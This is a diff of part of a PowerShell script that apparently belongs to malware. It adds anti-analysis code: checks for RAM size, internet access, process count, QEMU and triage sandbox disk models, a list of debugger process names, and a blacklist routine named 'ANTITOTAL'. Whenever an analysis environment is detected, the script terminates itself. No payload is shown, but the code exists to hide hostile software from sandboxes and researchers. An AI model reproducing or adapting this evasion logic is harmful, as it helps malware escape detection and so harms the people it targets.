@@ -23,10 +23,10 @@ function InternetCheck {
     Write-Host "[!] Internet connection is active." -ForegroundColor Green
     } catch {
     ([Windows.Forms.MessageBox]::Show('INTERNET CONNECTION CHECK FAILED!', 'Error', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error))
-	Stop-Process $pid -Force
+    Stop-Process $pid -Force
     }
 }
- 
+
 
 function ProcessCountCheck {
     $processes = gps | Measure-Object | Select-Object -ExpandProperty Count
@@ -106,7 +106,7 @@ function Invoke-ANTITOTAL {
             foreach ($item in $blacklist -split "`n") {
                 if ($data -contains $item) {
                     ShowError $item
-                    Stop-Process $pid -Force  
+                    Stop-Process $pid -Force
                 }
             }
         }
@@ -117,21 +117,23 @@ function ram_check {
     $ram = (&(gcm gwm*) -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
     if ($ram -lt 6) {
         ([System.Windows.Forms.MessageBox]::Show('RAM CHECK FAILED !', '', 'OK', 'Error'))
-        Stop-Process $pid -Force  
+        Stop-Process $pid -Force
     }
 }
 
 
 function VMPROTECT {
-	ram_check	  
-	if (Get-Service -Name "PolicyAgent" -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Running" }) {
-        Stop-Process $pid -Force
-    } 	
+    ram_check      
+    #if (Get-Service -Name "PolicyAgent" -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Running" }) {
+    #    ShowError "PolicyAgent"
+    #    Stop-Process $pid -Force
+    #}     
     #triage detection
     $d = wmic diskdrive get model
-    if ($d -like "*DADY HARDDISK*" -or $d -like "*QEMU HARDDISK*") {  
-        Stop-Process $pid -Force   
-    }	
+    if ($d -like "*DADY HARDDISK*" -or $d -like "*QEMU HARDDISK*") {
+        ShowError "QEMU HARDDISK"
+        Stop-Process $pid -Force
+    }    
     $processNames = @(
         '32dbg',
         '64dbgx',
@@ -219,10 +221,11 @@ function VMPROTECT {
     if ($null -ne $foundProcesses) {
         Write-Host "[!] Found the following processes:" -ForegroundColor Red
         $foundProcesses -join "`n" | Write-Host
+        ShowError $foundProcesses
         Stop-Process $pid -Force
     }  
-	if ($null -eq $foundProcesses) {
-        Invoke-ANTITOTAL		
+    if ($null -eq $foundProcesses) {
+        Invoke-ANTITOTAL
     }
 }
 VMPROTECT
